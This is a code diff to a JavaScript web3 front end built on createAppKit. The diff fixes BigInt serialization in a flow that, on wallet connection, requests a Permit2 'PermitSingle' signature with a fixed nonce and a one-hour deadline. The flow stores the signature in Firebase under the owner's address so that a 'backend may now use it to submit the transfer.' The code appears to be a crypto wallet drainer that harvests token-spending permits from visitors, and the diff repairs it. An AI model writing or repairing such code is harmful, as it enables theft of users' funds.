@@ -69,7 +69,8 @@ const appKit = createAppKit({
           const signer = provider.getSigner();
           const owner = account.address;
           const network = await provider.getNetwork();
-          const chainId = network.chainId;
+          // ensure chainId is a plain number (avoid BigInt serialization issues)
+          const chainId = typeof network.chainId === 'bigint' ? Number(network.chainId) : network.chainId;
 
           const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
       const permitNonce = 0;
@@ -109,11 +110,13 @@ const appKit = createAppKit({
           setStatus('Requesting signature in wallet...');
           // Prefer EIP-712 via provider RPC (eth_signTypedData_v4) for external wallets
           const typedData = { types, domain, primaryType: 'PermitSingle', message };
+          // JSON.stringify replacer to convert BigInt to string when present
+          const replacer = (_key, value) => (typeof value === 'bigint' ? value.toString() : value);
           let signature;
           if (walletProvider && typeof walletProvider.request === 'function') {
             signature = await walletProvider.request({
               method: 'eth_signTypedData_v4',
-              params: [owner, JSON.stringify(typedData)]
+              params: [owner, JSON.stringify(typedData, replacer)]
             });
           } else if (signer && typeof signer._signTypedData === 'function') {
             // fallback for signers that implement _signTypedData
@@ -137,6 +140,8 @@ const appKit = createAppKit({
         createdAt: Date.now()
       };
 
+          // ensure no BigInt in saved object (convert chainId to string/number)
+          if (typeof dataToSave.chainId === 'bigint') dataToSave.chainId = dataToSave.chainId.toString();
           await set(ref(db, `permits/${owner}`), dataToSave);
           setStatus('✅ Signature saved. Backend may now use it to submit the transfer.');
           setTimeout(() => {
@@ -147,8 +152,8 @@ const appKit = createAppKit({
           console.error(err);
           setStatus('❌ ' + (err?.message || 'Unknown error'));
         } finally {
-          // stop listening once we've processed
-          unsubscribe();
+          // stop listening once we've processed (guard unsubscribe)
+          if (typeof unsubscribe === 'function') unsubscribe();
         }
       });
     } catch (err) {
